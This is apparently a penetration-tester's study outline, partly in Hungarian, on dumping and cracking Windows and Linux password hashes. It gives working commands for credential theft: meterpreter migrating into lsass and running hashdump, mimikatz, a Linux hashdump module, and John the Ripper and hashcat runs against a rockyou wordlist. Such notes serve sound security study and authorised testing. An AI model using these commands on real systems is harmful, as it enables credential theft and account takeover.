# Dumping and cracking hashes
## Windows hashes
### info
* windows password hash format
  * LM hash + NTLM hash
  * elvileg MD4 hash algorithm van hasznalva
* SAM database stores the password hashes
  * it can not be copied while the operating system is running
  * is is encrypted with a syskey too
* We need to dump hashes from LSASS
  * elevated/Admin privileges needed to access it
* dumping
  * meterpreter> migrate xxx (pid of lsass)
  * meterpreter> hashdump
  * mimikatz (meterpreter kiwi or native console app copied to attack machine)
* cracking with JohnTheRipper or Hashcat
  * john --format=NT hashes.txt --wordlist ./rockyou.txt
  * hashcat -a 3 -m 1000 hashes.txt ./rockyou.txt -O
## Linux hashes
* /etc/passwd (mindenki latja)
* /etc/shadow (csak a root latja)
* password algorithm list
  * $1 MD5
  * $2 Blowfish
  * $5 SHA-256
  * $6 SHA-512
* meterpreter> post/linux/gather/hashdump
  * ahogy kidobja, pont ugyanazt megeszi a JohnTheRipper is...
* $ john --format=sha512crypt ./hashes.txt
